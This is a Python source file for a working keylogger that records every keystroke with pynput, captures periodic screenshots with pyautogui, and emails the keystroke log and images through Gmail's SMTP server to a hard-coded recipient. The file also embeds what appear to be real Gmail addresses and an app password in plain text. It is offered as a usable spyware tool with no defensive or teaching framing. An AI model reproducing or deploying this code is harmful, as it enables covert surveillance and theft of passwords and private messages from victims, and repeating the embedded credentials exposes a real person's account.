import json
import datetime
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import pyautogui

SENTENCE_DELIMITER = keyboard.Key.enter  # Change this if you want a different delimiter
key_list = []

# Email configurations
EMAIL_ADDRESS = 'guruprasadks2003@gmail.com'
EMAIL_PASSWORD = 'wwkf liug lqzc xqob'
RECIPIENT_EMAIL = 'guruprasadsenthilkumar@gmail.com'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

# Screenshot configuration
SCREENSHOT_INTERVAL = 120  # Capture screenshot every 120 seconds

def update_json_file(sentence):
    with open('logs.json', 'a+') as key_stroke:
        key_stroke.write(json.dumps(sentence) + '\n')
    send_email()

def send_email():
    subject = "Keylogger Report"
    message = MIMEMultipart()
    message['From'] = EMAIL_ADDRESS
    message['To'] = RECIPIENT_EMAIL
    message['Subject'] = subject
    message.attach(MIMEText('See attached log file and screenshots for details', 'plain'))

    # Attach log file
    filename = 'logs.json'
    with open(filename, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {filename}')
    message.attach(part)

    # Attach screenshots
    screenshot_filenames = capture_screenshots()
    for screenshot_filename in screenshot_filenames:
        with open(screenshot_filename, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {screenshot_filename}')
        message.attach(part)

    try:
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        text = message.as_string()
        server.sendmail(EMAIL_ADDRESS, RECIPIENT_EMAIL, text)
        server.quit()
        print("[+] Email sent successfully!")
    except Exception as e:
        print("[-] Error sending email:", e)

def capture_screenshots():
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    screenshot_filenames = []
    for i in range(2):  # Capture 2 screenshots
        screenshot_filename = f"screenshot_{timestamp}_{i+1}.png"
        pyautogui.screenshot(screenshot_filename)
        screenshot_filenames.append(screenshot_filename)
        print(f"[+]Screenshot'{screenshot_filename}' captured successfully!")
        time.sleep(1)  # Add a delay between screenshots to avoid capturing the same screen
    return screenshot_filenames

def on_press(key):
    global current_sentence
    if key == SENTENCE_DELIMITER:
        update_json_file(current_sentence)
        current_sentence = ""
    else:
        try:
            current_sentence += key.char
        except AttributeError:
            current_sentence += " "  # If a special key is pressed, add a space

def on_release(key):
    pass  # You may add some functionality here if needed

def start_keylogger():
    global current_sentence
    current_sentence = ""
    print("[+] Running keylogger successfully!")
    print("[1] Saving the keylogs in 'logs.json'")
    print("[2] Press 'q' to quit")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        while True:
            update_json_file(current_sentence)
            time.sleep(SCREENSHOT_INTERVAL)
        listener.join()

if __name__ == "__main__":
    start_keylogger()
